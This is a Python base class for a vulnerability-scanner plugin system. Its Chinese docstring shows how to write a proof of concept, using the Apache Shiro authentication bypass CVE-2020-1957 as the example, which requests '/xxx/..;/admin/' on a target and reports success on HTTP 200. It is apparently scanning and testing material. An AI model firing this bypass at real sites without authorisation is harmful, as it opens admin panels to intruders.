import lib

class Pocs:

    # poc名称
    poc_name = ''
    # 漏洞名称
    vul_name = ''
    # 漏洞编号
    vul_num = ''
    # 漏洞作者
    author = ''
    # 影响的应用
    app_name = ''
    # 影响应用的版本
    app_version = ''
    # 漏洞的具体信息
    msg = ''
    # 使用的payload
    payload = ''
    # poc需要的必须参数
    must_parameter = {
        'target' : ''
    }
    # poc需要的非必需参数
    choo_parameter = {

    }

    def __init__(self) -> None:
        # 扫描的结果信息
        pass

    
    def exploit(self,must_parameter,choo_parameter):
        '''
            进行攻击的函数
        '''
        self.att_msg['target']=must_parameter['target']
        self.parameter = must_parameter

    def get_info(self):
        '''
            获取poc信息的函数
        '''
        msg=[self.poc_name,self.vul_name,self.vul_num,self.author,self.app_name,self.app_version,self.msg]
        return msg
        
"""
如何编写poc
# 先导入你需要的模块 pocs必须导入，config可以选择，其中有定义好的http包头，可直接使用
import pocs
from lib import config
import re
import requests

# 定义类 名称不可改变，且需要继承父类Pocs
class POC(pocs.Pocs):

    def __init__(self):
        '''
            初始化函数
        '''
        # 根据漏洞的信息进行定义
        super().__init__()
        self.poc_name='shiro 未授权访问漏洞'
        self.vul_name='shiro 未授权访问漏洞'
        self.vul_num='CVE-2020-1957'
        self.app_name='shiro'
        self.app_version='12.x'
        self.author='haochen'
        self.msg='直接访问管理页面/admin/会被重定向至登陆页面，访问/xxx/..;/admin/可绕过登陆直接进入后台'
        # 根据需要的参数进行定义，被攻击的url或ip必须定义为target
        self.must_parameter={
            'target' : ''
        }

    def exploit(self,must_parameter,cho_parameter):
        '''
            扫描使用的函数
        '''
        # 自由发挥
        att_msg={}
        # 将攻击的目标和poc名称导入
        url = must_parameter['target']
        att_msg['target']=url
        att_msg['pocname'] = self.poc_name
        self.must_parameter = must_parameter
        head = config.Pack
        self.payload='/xxx/..;/admin/'
        if re.search('/$',url):
            url=url[0:len(url)-1]
        target = url + self.payload
        try:
            response = requests.get(target,headers=head)
            # 攻击完成后需要将攻击的结果写入
            if response.status_code == 200:
                att_msg['status'] = 'success'
                att_msg['msg'] = '存在漏洞'
            else:
                att_msg['status']='failed'
                att_msg['msg']='不存在漏洞，网站返回值为: '+str(response.status_code) 
                #self.set_cout('failed','不存在漏洞，网站返回值为: '+str(response.status_code) )
        except:
            att_msg['status']='error'
            att_msg['msg']='无法正确访问网站'
            #self.set_cout('error','无法正确访问网站！')
        # 返回攻击结果信息
        return att_msg
"""